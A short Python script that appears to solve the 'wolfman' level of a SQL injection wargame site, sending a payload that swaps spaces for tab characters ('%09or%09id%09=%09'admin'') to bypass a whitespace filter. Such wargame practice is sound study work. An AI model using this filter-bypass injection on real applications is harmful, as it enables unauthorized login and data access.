import requests
from urllib import parse

# 공백우회 문제

host = "https://los.rubiya.kr/chall/wolfman_4fdc56b75971e41981e3d1e2fbe9b7f7.php?pw="
cookies = {"PHPSESSID" : "8s7khiq67rue3qlsffsskni093"}
param = "'%09or%09id%09=%09'admin'%09--%09-"
res = requests.get(host + parse.quote(param), cookies=cookies)
print(res.text)